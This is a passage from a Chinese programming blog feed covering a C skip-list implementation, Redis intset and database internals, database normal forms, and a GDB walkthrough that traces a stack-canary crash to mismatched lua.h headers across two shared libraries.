class="keyword">while</span> (p-&gt;level[i].next &amp;&amp; p-&gt;level[i].next-&gt;value &lt; num) &#123;</span><br><span class="line">            p = p-&gt;level[i].next;</span><br><span class="line">        &#125;</span><br><span class="line">        preNodes[i] = p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p = p-&gt;level[<span class="number">0</span>].next;</span><br><span class="line">    <span class="keyword">if</span> (p &amp;&amp; p-&gt;value == num) &#123;	</span><br><span class="line">        skiplistNodeDelete(obj, p, preNodes);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">skiplistNodeDelete</span><span class="params">(Skiplist *obj, SkiplistNode *cur, SkiplistNode **preNodes)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; obj-&gt;level; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preNodes[i]-&gt;level[i].next == cur) &#123; <span class="comment">// 被删除的节点层数可能比跳表层数少，所以要加上这里的判断</span></span><br><span class="line">            preNodes[i]-&gt;level[i].next = cur-&gt;level[i].next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果删除的节点是层数最大的，那么可能需要更新跳表长度</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = obj-&gt;level - <span class="number">1</span>; i &gt;= <span class="number">1</span>; --i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj-&gt;head-&gt;level[i].next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        --obj-&gt;level;</span><br><span class="line">    &#125;</span><br><span class="line">    --obj-&gt;length;</span><br><span class="line">    <span class="comment">// 释放被删除节点空间</span></span><br><span class="line">    <span class="built_in">free</span>(cur);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="5-跳表的释放">5. 跳表的释放</span></h4><p>释放操作很简单。对于每个跳跃表节点，只需调1次<code>free()</code>即可。这也是<code>SkiplistNode</code>结构中<code>level</code>成员设计为柔性数组的好处。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">skiplistFree</span><span class="params">(Skiplist* obj)</span> &#123;</span><br><span class="line">    SkiplistNode *cur = obj-&gt;head-&gt;level[<span class="number">0</span>].next;</span><br><span class="line">    SkiplistNode *d;</span><br><span class="line">    <span class="keyword">while</span>(cur) &#123;</span><br><span class="line">        d = cur;</span><br><span class="line">        cur = cur-&gt;level[<span class="number">0</span>].next;</span><br><span class="line">        <span class="built_in">free</span>(d);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(obj-&gt;head);		   </span><br><span class="line">    <span class="built_in">free</span>(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码参考:<a href="https://leetcode-cn.com/problems/design-skiplist/solution/tiao-yue-biao-cyu-yan-shi-xian-by-pcj700">https://leetcode-cn.com/problems/design-skiplist/solution/tiao-yue-biao-cyu-yan-shi-xian-by-pcj700</a></p>
<h3><span id="参考资料">参考资料</span></h3><p>【1】 <a href="https://www.jianshu.com/p/9d8296562806">Skip List–跳表</a></p>
<p>【2】《数据结构与算法分析 C语言描述》原书第2版 10.4.2 —— 跳跃表</p>
<p>【3】《Redis设计与实现》—— 第5章 跳跃表</p>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记(五)——整数集合</title>
    <url>/2020/1206192958.html</url>
    <content><![CDATA[<h3><span id="前言">前言</span></h3><p>Redis中，整数集合是集合键的底层之一。</p>
<p>当一个集合只包含整数元素，且这个集合中元素个数不多的情况下，Redis就会使用整数集合作为集合键的底层实现。</p>
<h3><span id="1-整数集合的实现">1. 整数集合的实现</span></h3><span id="more"></span>

<h4><span id="11-数据结构设计">1.1 数据结构设计</span></h4><p>以Redis6.0源码为例，整数集合由<code>intset.c/intset</code>结构定义，数据结构设计如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">intset</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> encoding;			<span class="comment">// 编码方式</span></span><br><span class="line">    <span class="type">uint32_t</span> length;			<span class="comment">// 集合中的元素个数</span></span><br><span class="line">    <span class="type">int8_t</span> contents[];			<span class="comment">// 用于保存集合中的元素</span></span><br><span class="line">&#125; intset;</span><br></pre></td></tr></table></figure>

<ul>
<li>length属性表示整数集合中元素的个数。</li>
<li>集合中所有元素以<strong>有序、无重复</strong>的方式保存在contents数组。</li>
<li><strong>虽然contents是int8_t类型，但它本身不保存int8_t类型的元素</strong>。实际上，contents数组保存的元素类型由encoding属性决定，encoding属性有以下3种取值：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// intset.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTSET_ENC_INT16 (sizeof(int16_t))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTSET_ENC_INT32 (sizeof(int32_t))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTSET_ENC_INT64 (sizeof(int64_t))</span></span><br></pre></td></tr></table></figure>

<p>举例，如encoding取值为<code>INTSET_ENC_INT32</code>，表示contents数组保存的每个元素都是int32_t类型的整数。</p>
<p>下图表示一个包含3个类型为uint16_t的元素的整数集合：<br><img data-src="/2020/1206192958/image1.png"></p>
<p>当创建空的整数集合时，为了节约内存，默认的encoding取值为<code>INTSET_ENC_INT16</code>(参考<code>intset.c/intsetNew</code>的实现)</p>
<h4><span id="12-升级操作">1.2 升级操作</span></h4><p>考虑插入新元素a到整数集合S的场景：如果新元素所占字节大小大于整数集合中现有的任意一个元素所占字节大小(即<code>sizeof(a) &gt; S.encoding</code>），就需要先对整数集合执行<strong>升级</strong>操作后，再执行插入操作。</p>
<p>升级操作的要点如下：</p>
<ul>
<li>根据新元素类型，计算扩展后的整数集合需要分配的空间大小，并调用realloc分配空间。</li>
<li>将原整数集合中所有元素类型转换为和新元素相同，并将所有转化后的元素有序地放到正确的位置上。</li>
<li>将新元素添加到整数集合。<strong>升级后新元素放置的位置要么在最开头，要么在最结尾</strong>，其原因在于：<strong>能引发升级的新元素，它的值要么小于先前整数集合中的所有元素，要么大于所有元素。</strong></li>
</ul>
<p>升级操作的源码实现参考<code>intset.c/intsetUpgradeAndAdd</code>, 如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> intset *<span class="title function_">intsetUpgradeAndAdd</span><span class="params">(intset *is, <span class="type">int64_t</span> value)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> curenc = intrev32ifbe(is-&gt;encoding);</span><br><span class="line">    <span class="type">uint8_t</span> newenc = _intsetValueEncoding(value);</span><br><span class="line">    <span class="type">int</span> length = intrev32ifbe(is-&gt;length);</span><br><span class="line">    <span class="type">int</span> prepend = value &lt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First set new encoding and resize */</span></span><br><span class="line">    is-&gt;encoding = intrev32ifbe(newenc);</span><br><span class="line">    is = intsetResize(is,intrev32ifbe(is-&gt;length)+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Upgrade back-to-front so we don&#x27;t overwrite values.</span></span><br><span class="line"><span class="comment">     * Note that the &quot;prepend&quot; variable is used to make sure we have an empty</span></span><br><span class="line"><span class="comment">     * space at either the beginning or the end of the intset. */</span></span><br><span class="line">    <span class="keyword">while</span>(length--)</span><br><span class="line">        _intsetSet(is,length+prepend,_intsetGetEncoded(is,length,curenc));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set the value at the beginning or the end. */</span></span><br><span class="line">    <span class="keyword">if</span> (prepend)</span><br><span class="line">        _intsetSet(is,<span class="number">0</span>,value);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        _intsetSet(is,intrev32ifbe(is-&gt;length),value);</span><br><span class="line">    is-&gt;length = intrev32ifbe(intrev32ifbe(is-&gt;length)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> is;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另外，Redis中的整数集合不支持降级操作。</p>
<h3><span id="2-整数集合的api">2. 整数集合的API</span></h3><table>
<thead>
<tr>
<th align="left">API</th>
<th align="left">功能</th>
<th align="left">复杂度</th>
</tr>
</thead>
<tbody><tr>
<td align="left">intset *intsetNew(void);</td>
<td align="left">创建空的整数集合</td>
<td align="left">O(1)</td>
</tr>
<tr>
<td align="left">intset *intsetAdd(intset *is, int64_t value, uint8_t *success);</td>
<td align="left">插入新元素到整数集合</td>
<td align="left">O(N)</td>
</tr>
<tr>
<td align="left">intset *intsetRemove(intset *is, int64_t value, int *success);</td>
<td align="left">删除整数集合中的指定元素</td>
<td align="left">O(N)</td>
</tr>
<tr>
<td align="left">uint8_t intsetFind(intset *is, int64_t value);</td>
<td align="left">查询元素是否在整数集合中。用二分查找法实现</td>
<td align="left">O(logN)</td>
</tr>
</tbody></table>
<h3><span id="参考资料">参考资料</span></h3><p>【1】《Redis设计与实现》 —— 第6章 整数集合</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>__stack_chk_fail栈溢出问题定位</title>
    <url>/2020/1216193417.html</url>
    <content><![CDATA[<h3><span id="问题描述">问题描述</span></h3><p>进程收到<code>SIGABRT</code>信号异常退出，异常调用栈显示<code>__stack_chk_fail</code></p>
<h3><span id="原因分析和定位思路">原因分析和定位思路</span></h3><p><strong>原因分析：</strong> <code>__stack_chk_fail</code>说明<strong>发生了缓冲区溢出，canary被破坏</strong>。这说明代码设置GCC编译选项<strong>fstack-protector</strong>，开启了<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/">栈保护机制canary</a></p>
<p><strong>定位思路：</strong></p>
<span id="more"></span>

<ul>
<li>先通过反汇编找到<code>canary</code>在栈上的存放地址。</li>
<li>用GDB对<code>canary</code>的存放地址打数据断点，定位出导致栈破坏的指令，再结合C代码具体分析。</li>
</ul>
<h3><span id="定位过程">定位过程</span></h3><p>以下给出一个简化案例：一个可执行程序test, 依赖两个.so：<code>libcomp1.so</code>, <code>libcomp2.so</code>。执行<code>test</code>程序后会异常退出，调用栈显示<code>__stack_chk_fail</code></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">├── CMakeLists.txt			—— 可执行程序 test, 依赖libcomp1.so, libcomp2.so</span><br><span class="line">├── comp1</span><br><span class="line">│   ├── CMakeLists.txt		—— libcomp1.so</span><br><span class="line">│   ├── comp1.c</span><br><span class="line">│   ├── lua.h</span><br><span class="line">├── comp2</span><br><span class="line">│   ├── CMakeLists.txt		-- libcomp2.so</span><br><span class="line">│   ├── comp2.c</span><br><span class="line">│   ├── lua.h</span><br><span class="line">├── main.c</span><br></pre></td></tr></table></figure>

<p>C代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.c</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">func1</span><span class="params">()</span>;	<span class="comment">// defined in libcomp1.so</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    func1();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// comp1/comp1.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;lua.h&quot;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="title function_">func2</span><span class="params">(<span class="keyword">struct</span> lua_Debug *a, <span class="type">char</span> *b, <span class="type">int</span> c)</span>; <span class="comment">// defined in libcomp2.so</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lua_Debug</span> <span class="title">a</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> *b = <span class="number">0x12345678</span>;</span><br><span class="line">    <span class="type">int</span> c = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    func2(&amp;a, b, c);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// comp2/comp2.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;lua.h&quot;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func2</span><span class="params">(<span class="keyword">struct</span> lua_Debug *a, <span class="type">char</span> *b, <span class="type">int</span> c)</span> &#123;</span><br><span class="line">    a-&gt;i_ci = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用GDB调试test程序，出现如下的异常调用栈</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) bt</span><br><span class="line">#0  __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:50</span><br><span class="line">#1  0x00007ffff7e1c535 in __GI_abort () at abort.c:79</span><br><span class="line">#2  0x00007ffff7e73508 in __libc_message (action=&lt;optimized out&gt;, fmt=fmt@entry=0x7ffff7f7e07b &quot;*** %s ***: %s terminated\n&quot;)</span><br><span class="line">    at ../sysdeps/posix/libc_fatal.c:181</span><br><span class="line">#3  0x00007ffff7f0480d in __GI___fortify_fail_abort (need_backtrace=need_backtrace@entry=false,</span><br><span class="line">    msg=msg@entry=0x7ffff7f7e059 &quot;stack smashing detected&quot;) at fortify_fail.c:28</span><br><span class="line">#4  0x00007ffff7f047c2 in __stack_chk_fail () at stack_chk_fail.c:29</span><br><span class="line">#5  0x00007ffff7fca189 in func1 () at /home/pc/LUA/comp1/comp1.c:13</span><br><span class="line">#6  0x0000555555555143 in main () at /home/pc/LUA/main.c:7</span><br></pre></td></tr></table></figure>

<p>第4帧出现<code>__stack_chk_fail</code>，这表示程序出现了栈溢出。定位思路如下：</p>
<h4><span id="1-先通过反汇编找到canary在栈上的存放地址">1. 先通过反汇编找到<code>canary</code>在栈上的存放地址。</span></h4><p>用gdb查看出现<code>__stack_chk_fail</code>的前一个函数帧，即第5帧的汇编代码。通过<code>frame</code>命令切换函数帧，<code>disassemble</code>查看反汇编代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) frame 5</span><br><span class="line">#5  0x00007ffff7fca189 in func1 () at /home/pc/LUA/comp1/comp1.c:13</span><br><span class="line">13      &#125;</span><br><span class="line">(gdb) disassemble</span><br><span class="line">Dump of assembler code for function func1:</span><br><span class="line">   0x00007ffff7fca115 &lt;+0&gt;:     push   %rbp</span><br><span class="line">   0x00007ffff7fca116 &lt;+1&gt;:     mov    %rsp,%rbp</span><br><span class="line">   0x00007ffff7fca119 &lt;+4&gt;:     sub    $0x90,%rsp				# 栈上共分配144字节空间: (8字节canary + 120字节lua_Debug + 8字节char * + 4字节int, 4字节对齐 = 144字节)</span><br><span class="line">   0x00007ffff7fca120 &lt;+11&gt;:    mov    %fs:0x28,%rax			# %fs:0x28说明，canary值是通过段寻址方式从内存中读入的</span><br><span class="line">   0x00007ffff7fca129 &lt;+20&gt;:    mov    %rax,-0x8(%rbp)			# 将canary存储到栈中，位于$rbp - 0x8处</span><br><span class="line">   0x00007ffff7fca12d &lt;+24&gt;:    xor    %eax,%eax</span><br><span class="line">   0x00007ffff7fca12f &lt;+26&gt;:    lea    -0x80(%rbp),%rdx			# comp1.c/func1(): struct lua_Debug a = &#123;0&#125;;</span><br><span class="line">   0x00007ffff7fca133 &lt;+30&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x00007ffff7fca138 &lt;+35&gt;:    mov    $0xf,%ecx</span><br><span class="line">   0x00007ffff7fca13d &lt;+40&gt;:    mov    %rdx,%rdi</span><br><span class="line">   0x00007ffff7fca140 &lt;+43&gt;:    rep stos %rax,%es:(%rdi)</span><br><span class="line">   0x00007ffff7fca143 &lt;+46&gt;:    movq   $0x12345678,-0x88(%rbp)	# comp1.c/func1(): char *b = 0x12345678;</span><br><span class="line">   0x00007ffff7fca14e &lt;+57&gt;:    movl   $0xffffffff,-0x8c(%rbp)	# comp1.c/func1(): int c = 0xFFFFFFFF;</span><br><span class="line">   0x00007ffff7fca158 &lt;+67&gt;:    mov    -0x8c(%rbp),%edx			# c</span><br><span class="line">   0x00007ffff7fca15e &lt;+73&gt;:    mov    -0x88(%rbp),%rcx			# b</span><br><span class="line">   0x00007ffff7fca165 &lt;+80&gt;:    lea    -0x80(%rbp),%rax			# a</span><br><span class="line">   0x00007ffff7fca169 &lt;+84&gt;:    mov    %rcx,%rsi</span><br><span class="line">   0x00007ffff7fca16c &lt;+87&gt;:    mov    %rax,%rdi</span><br><span class="line">   0x00007ffff7fca16f &lt;+90&gt;:    callq  0x7ffff7fca040 &lt;func2@plt&gt;</span><br><span class="line">   0x00007ffff7fca174 &lt;+95&gt;:    nop</span><br><span class="line">   0x00007ffff7fca175 &lt;+96&gt;:    mov    -0x8(%rbp),%rax</span><br><span class="line">   0x00007ffff7fca179 &lt;+100&gt;:   xor    %fs:0x28,%rax			 # 从段寄存器取出canary的值，和栈上$rbp - 0x8处比较，如果发现canary被修改, 调用__stack_chk_fail进行错误处理</span><br><span class="line">   0x00007ffff7fca182 &lt;+109&gt;:   je     0x7ffff7fca189 &lt;func1+116&gt;</span><br><span class="line">   0x00007ffff7fca184 &lt;+111&gt;:   callq  0x7ffff7fca030 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">=&gt; 0x00007ffff7fca189 &lt;+116&gt;:   leaveq # movq %rbp %rsp, popq %rbp</span><br><span class="line">   0x00007ffff7fca18a &lt;+117&gt;:   retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p><code>0x00007ffff7fca119：sub $0x90,%rsp</code>：表示栈上分配了<strong>144</strong>个字节，依次存放三个局部变量a, b, c</p>
<p><code>0x00007ffff7fca120 &lt;+11&gt;: mov  %fs:0x28,%rax</code>：其中指令参数<code>$fs:0x28</code>说明<code>canary</code><strong>通过段寻址从内存中读入。canary值存放在一个特殊的段中，标志为只读，这样攻击者就无法覆盖canary的值。</strong></p>
<p><code>0x00007ffff7fca129 &lt;+20&gt;: mov %rax,-0x8(%rbp)</code>：说明canary在栈上存放地址是<code>$rbp - 0x8</code>。</p>
<p>根据x86_64过程调用的函数参数传递规则，可确定栈上所有局部变量和<code>canary</code>是如何存放的。<code>func1</code>的栈组织如下：</p>
<p><img data-src="/2020/1216193417/image1.png"></p>
<h4><span id="2-用gdb对canary的存放地址打数据断点定位出导致栈破坏的指令">2. 用GDB对<code>canary</code>的存放地址打数据断点，定位出导致栈破坏的指令</span></h4><p>对<code>func1</code>打断点，重新执行程序，接着用<code>watch</code>命令，对<code>canary</code>的存放地址打数据断点，操作如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble</span><br><span class="line">Dump of assembler code for function func1:</span><br><span class="line">   0x00007ffff7fca115 &lt;+0&gt;:     push   %rbp</span><br><span class="line">   0x00007ffff7fca116 &lt;+1&gt;:     mov    %rsp,%rbp</span><br><span class="line">   0x00007ffff7fca119 &lt;+4&gt;:     sub    $0x90,%rsp</span><br><span class="line">   0x00007ffff7fca120 &lt;+11&gt;:    mov    %fs:0x28,%rax</span><br><span class="line">   0x00007ffff7fca129 &lt;+20&gt;:    mov    %rax,-0x8(%rbp)</span><br><span class="line">=&gt; 0x00007ffff7fca12d &lt;+24&gt;:    xor    %eax,%eax</span><br><span class="line">   0x00007ffff7fca12f &lt;+26&gt;:    lea    -0x80(%rbp),%rdx</span><br><span class="line">   ......</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) p $rbp - 0x8</span><br><span class="line">$8 = (void *) 0x7fffffffe4a8</span><br><span class="line">(gdb) watch *0x7fffffffe4a8							# 此处对canary在栈中存放的地址打数据断点！</span><br><span class="line">Hardware watchpoint 2: *0x7fffffffe4a8</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Hardware watchpoint 2: *0x7fffffffe4a8</span><br><span class="line">Old value = 1303192064</span><br><span class="line">New value = 1</span><br><span class="line"></span><br><span class="line">(gdb) disassemble</span><br><span class="line">Dump of assembler code for function func2:</span><br><span class="line">   0x00007ffff7fc50f5 &lt;+0&gt;:     push   %rbp</span><br><span class="line">   0x00007ffff7fc50f6 &lt;+1&gt;:     mov    %rsp,%rbp</span><br><span class="line">   0x00007ffff7fc50f9 &lt;+4&gt;:     mov    %rdi,-0x8(%rbp)     # 第一个入参，lua_Debug *a</span><br><span class="line">   0x00007ffff7fc50fd &lt;+8&gt;:     mov    %rsi,-0x10(%rbp)</span><br><span class="line">   0x00007ffff7fc5101 &lt;+12&gt;:    mov    %edx,-0x14(%rbp)</span><br><span class="line">   0x00007ffff7fc5104 &lt;+15&gt;:    mov    -0x8(%rbp),%rax	   # 第一个入参，lua_Debug *a</span><br><span class="line">   0x00007ffff7fc5108 &lt;+19&gt;:    movq   $0x1,0x78(%rax)     # comp2.c/func2(): a-&gt;i_ci = 1; 这句导致canary被破坏</span><br><span class="line">=&gt; 0x00007ffff7fc5110 &lt;+27&gt;:    nop 	# 箭头指向的指令表示下一步即将执行的指令，也就是说是上一条指令movq $0x1,0x78(%rax)触发的数据断点!</span><br><span class="line">   0x00007ffff7fc5111 &lt;+28&gt;:    pop    %rbp</span><br><span class="line">   0x00007ffff7fc5112 &lt;+29&gt;:    retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>数据断点被触发，定位出<code>0x00007ffff7fc5108: $0x1,0x78(%rax)</code>导致<code>canary</code>破坏，结合汇编上下文和C码确定，这条指令关联的C语句是<code>a-&gt;i_ci = 1;</code></p>
<h4><span id="为什么对lua_debug结构体的成员赋值会导致栈溢出">为什么对lua_Debug结构体的成员赋值会导致栈溢出？</span></h4><p>由<code>$0x1,0x78(%rax)</code>可以确定<code>i_ci</code>成员距离结构体首地址的偏移为0x78，即120字节。事实上，在<code>func2</code>的函数帧中，<code>lua_Debug</code>结构体大小为128字节，而<code>func1</code>中的<code>lua_Debug</code>结构体只有120字节。</p>
<p>结合<code>func1</code>的栈帧发现栈溢出的直接原因：<font color="red"><strong>a-&gt;i_ci &#x3D; 1; 语句执行后，恰好导致canary的值被改写为1。</strong></font></p>
<p>通过<code>gdb</code>也能发现两个.so中的结构体大小不一致问题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) f 1</span><br><span class="line">#1  0x00007ffff7fca174 in func1 () at /home/pc/LUA/comp1/comp1.c:11</span><br><span class="line">11          func2(&amp;a, b, c);</span><br><span class="line">(gdb) p sizeof(struct lua_Debug)</span><br><span class="line">$24 = 120							# func1中结构体大小为120</span><br><span class="line">(gdb) f 0</span><br><span class="line">#0  func2 (a=0x7fffffffe430, b=0x12345678 &lt;error: Cannot access memory at address 0x12345678&gt;, c=-1) at /home/pc/LUA/comp2/comp2.c:5</span><br><span class="line">5           return;</span><br><span class="line">(gdb) p sizeof(struct lua_Debug)</span><br><span class="line">$27 = 128							# func2中结构体大小为128</span><br></pre></td></tr></table></figure>

<p><code>lua_Debug</code>结构体在<code>lua.h</code>定义的，这个错误原因是<strong>由于两个.so编译使用的lua.h头文件不一致，导致栈溢出问题。</strong>以下分别给出两个.so的<code>lua.h</code>：</p>
<p><img data-src="/2020/1216193417/image2.png"></p>
<p>根据64位<strong>结构体对齐规则</strong>，左边结构体大小为120，右边结构体大小为128，多出的这8个字节恰好覆盖了<code>canary</code>，导致栈溢出。</p>
<h3><span id="总结">总结</span></h3><ul>
<li><p>公司的C代码中，多个.so会依赖相同的开源头文件，如果不能保证每个.so各自依赖的头文件版本一致，就可能出现上述的栈溢出问题。</p>
</li>
<li><p>通过设置GCC的编译选项fstack-protector开启栈保护机制，便于栈溢出问题的定位。</p>
</li>
</ul>
<h3><span id="参考资料">参考资料</span></h3><p>《深入理解计算机系统 原书第3版》 3.10.4.2 栈破坏检测</p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>GDB</tag>
      </tags>
  </entry>
  <entry>
    <title>什么是三大范式, 为什么要有三大范式, 什么场景下不用遵循三大范式</title>
    <url>/2021/0101162248.html</url>
    <content><![CDATA[<h2><span id="什么是三大范式">什么是三大范式</span></h2><p>三大范式是数据库设计遵循的规范, 分别是：</p>
<ul>
<li>第一范式(1NF)：表中每列不可再拆分</li>
<li>第二范式(2NF)：1NF基础上，要求非主键列完全依赖于主键，不能只依赖于主键的一部分(针对联合主键)</li>
<li>第三范式(3NF)：2NF基础上, 要求任何非主键列必须直接依赖于主键，不能是传递依赖</li>
</ul>
<span id="more"></span>

<h2><span id="为什么要有三大范式">为什么要有三大范式</span></h2><p>减少数据冗余，保持数据一致性和完整性。</p>
<h2><span id="1nf">1NF</span></h2><p>例: 有一个学生表，address字段的值为<code>江苏省南京市雨花台区XX街道XX小区</code></p>
<table>
<thead>
<tr>
<th>id</th>
<th>name</th>
<th>address</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>张三</td>
<td>江苏省南京市雨花台区XX街道XX小区</td>
</tr>
</tbody></table>
<p>此时如果需要把学生按省,市,区分类, 无法满足需求；这里可以把address字段可以继续拆分为province, city, area, address，实现1NF</p>
<table>
<thead>
<tr>
<th>id</th>
<th>name</th>
<th>province</th>
<th>city</th>
<th>area</th>
<th>address</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>张三</td>
<td>江苏</td>
<td>南京</td>
<td>雨花台</td>
<td>XX街道XX小区</td>
</tr>
</tbody></table>
<h2><span id="2nf">2NF</span></h2><p>例: 有一个学生课程表</p>
<table>
<thead>
<tr>
<th>学号(主键)</th>
<th>课程(主键)</th>
<th>教师姓名</th>
<th>成绩</th>
<th>学生姓名</th>
<th>专业</th>
</tr>
</thead>
<tbody><tr>
<td>1001</td>
<td>C语言</td>
<td>张三</td>
<td>80</td>
<td>李四</td>
<td>金融工程</td>
</tr>
<tr>
<td>1002</td>
<td>JAVA</td>
<td>王五</td>
<td>66</td>
<td>王二</td>
<td>计算机科学与技术</td>
</tr>
</tbody></table>
<p>从上表看出, 教师姓名,成绩依赖于学号和课程，但学生姓名和专业仅依赖于学号，不依赖于课程，不符合2NF<br>可以拆成如下两张表，实现2NF</p>
<table>
<thead>
<tr>
<th>学号(主键)</th>
<th>课程(主键)</th>
<th>教师姓名</th>
<th>成绩</th>
</tr>
</thead>
<tbody><tr>
<td>1001</td>
<td>C语言</td>
<td>张三</td>
<td>80</td>
</tr>
<tr>
<td>1002</td>
<td>JAVA</td>
<td>王五</td>
<td>66</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>学号(主键)</th>
<th>学生姓名</th>
<th>专业</th>
</tr>
</thead>
<tbody><tr>
<td>1001</td>
<td>李四</td>
<td>金融工程</td>
</tr>
<tr>
<td>1002</td>
<td>王二</td>
<td>计算机科学与技术</td>
</tr>
</tbody></table>
<h2><span id="3nf">3NF</span></h2><p>例：有个学生表(学号,姓名,学院,学院地点,学院电话), 学号为主键。<br>这个数据库符合2NF，但不符合3NF，因为(学院地点,学院电话)依赖于学院，需要把表拆分为如下两个表，以符合3NF:</p>
<ul>
<li>学生表(学号,姓名,学院)</li>
<li>学院表(学院,学院地点,学院电话)</li>
</ul>
<h2><span id="什么场景可以不遵循三大范式">什么场景可以不遵循三大范式</span></h2><p>为了提高查询效率，有时需要适当保留冗余数据，不必严格遵循三大范式<br>例: 订单表中添加”总金额”字段，”总金额”可以通过”数量”乘以”单价”得到，是冗余字段，不符合3NF。但是增加这个冗余字段，可以提高查询速度。</p>
<h2><span id="参考">参考</span></h2><p><a href="https://juejin.cn/post/6844904184865619982">https://juejin.cn/post/6844904184865619982</a></p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记(七)——数据库</title>
    <url>/2021/0313194553.html</url>
    <content><![CDATA[<h3><span id="前言">前言</span></h3><p>介绍Redis数据库的实现，解答以下几个问题：</p>
<ul>
<li>Redis服务器是怎么保存数据库的？客户端又是怎么切换数据库的？</li>
<li>数据库的增、删、改、查的实现</li>
<li>键的过期时间是怎么保存的，又是如何删除的？怎么判断一个键是否过期？</li>
<li>过期键的删除策略有哪些？每种策略的优缺点分析？Redis采用的是哪种策略，具体又是怎么实现的？</li>
</ul>
<span id="more"></span>

<h3><span id="服务器中的数据库">服务器中的数据库</span></h3><p>Redis将所有数据库都保存在服务器状态 <code>server.h/redisServer</code>结构的db数组中，db数组中的每一项表示一个数据库, dbnum表示数据库个数。 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">redisServer</span> &#123;</span></span><br><span class="line">	redisDb *db;	<span class="comment">// db数组保存所有数据库</span></span><br><span class="line">    <span class="type">int</span> dbnum;		<span class="comment">// 表示数据库个数</span></span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

